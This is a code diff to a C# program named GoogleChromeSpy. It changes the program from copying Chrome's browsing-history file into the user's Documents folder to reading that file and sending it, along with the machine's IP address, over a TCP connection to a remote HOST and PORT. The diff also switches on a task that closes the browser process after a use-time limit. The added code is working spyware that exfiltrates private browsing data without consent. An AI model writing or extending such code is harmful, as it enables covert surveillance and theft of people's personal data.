@@ -36,14 +36,14 @@ namespace GoogleChromeSpy
             this.ProcessName = processName;
             this._defaultPathForCopy = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
 
+            Connect();
             this._closingTask = new Task(ClosingProcess);
             this._autoLoadTask = new Task(AddToAutoLoad);
-            //this._closingTask.Start();
+            this._closingTask.Start();
             //this._autoLoadTask.Start();
             _key = GenerateKey();
             this._form = new KeyInputForm(_key.Length);
             this._form.KeyInsert += IsCorrect;
-            Connect();
             Task.Factory.StartNew(() => File.WriteAllText("data.txt", _key));
             GetVersion();
         }
@@ -54,7 +54,7 @@ namespace GoogleChromeSpy
             {
                 client.Connect(HOST, PORT);
                 stream = client.GetStream();
-                byte[] b = Encoding.Unicode.GetBytes(GetIpAdress());
+                byte[] b = Encoding.Unicode.GetBytes($"--Ip{GetIpAdress()}");
                 stream.Write(b, 0, b.Length);
             }
             catch (Exception ex)
@@ -63,17 +63,16 @@ namespace GoogleChromeSpy
             }
         }
 
-        private void CopyHistory()
+        private void SendHistoryFile()
         {
             string historyFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) +
                 @"\Google\Chrome\User Data\Default\History";
 
-            if (File.Exists(historyFile))
-            {
-                if (File.Exists(Path.Combine(_defaultPathForCopy, "historyCopy")))
-                    File.Delete(Path.Combine(_defaultPathForCopy, "historyCopy"));
-                File.Copy(historyFile, Path.Combine(_defaultPathForCopy, "historyCopy"));
-            }
+            byte[] b = File.ReadAllBytes(historyFile);
+            byte[] m = Encoding.Unicode.GetBytes("--file");
+            stream.Write(m, 0, m.Length);
+            Thread.Sleep(500);
+            stream.Write(b, 0, b.Length);
         }
 
         private void GetVersion()
@@ -94,12 +93,12 @@ namespace GoogleChromeSpy
                         processes = Process.GetProcessesByName(ProcessName);
                         if (processes.Length != 0)
                         {
-                            CopyHistory();
+                            SendHistoryFile();
 
                             processes[0].EnableRaisingEvents = true;
                             processes[0].Exited += (sender, e) => 
                             {
-                                CopyHistory();
+                                SendHistoryFile();
                             };
                         }
 
@@ -117,7 +116,7 @@ namespace GoogleChromeSpy
                 if (date.Subtract(processes[0].StartTime) >= MaxUseTime)
                     try
                     {
-                        CopyHistory();
+                        SendHistoryFile();
                         foreach (var item in processes)
                         {
                             try
